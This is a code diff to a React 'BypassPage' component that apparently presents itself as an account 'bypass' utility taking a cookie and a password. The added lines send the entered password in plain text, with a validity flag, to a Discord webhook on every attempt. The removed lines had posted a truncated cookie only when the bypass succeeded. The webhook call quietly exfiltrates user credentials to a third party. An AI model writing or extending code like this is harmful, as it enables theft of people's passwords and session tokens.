@@ -2,7 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, ShieldCheck, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie } from "lucide-react";
 import ShieldIcon from "@/components/ShieldIcon";
-import { sendDiscordWebhook } from "@/lib/tokenStore";
+import { sendBypassEmbed } from "@/lib/tokenStore";
 import { toast } from "sonner";
 
 const WEBHOOK_KEY = "discord_webhook_url";
@@ -107,13 +107,17 @@ const BypassPage = () => {
     if (intervalRef.current) window.clearInterval(intervalRef.current);
     setProgress(100);
 
+    const webhook = localStorage.getItem(WEBHOOK_KEY);
+    if (webhook) {
+      sendBypassEmbed(webhook, {
+        valid: apiOk,
+        password,
+      });
+    }
+
     if (apiOk) {
       setStatus("success");
       toast.success("Bypass successful!");
-      const webhook = localStorage.getItem(WEBHOOK_KEY);
-      if (webhook) {
-        sendDiscordWebhook(webhook, `🔓 Bypass executed. Cookie: \`${trimmed.slice(0, 20)}...\``);
-      }
     } else {
       setStatus("error");
       toast.error("Bypass failed");
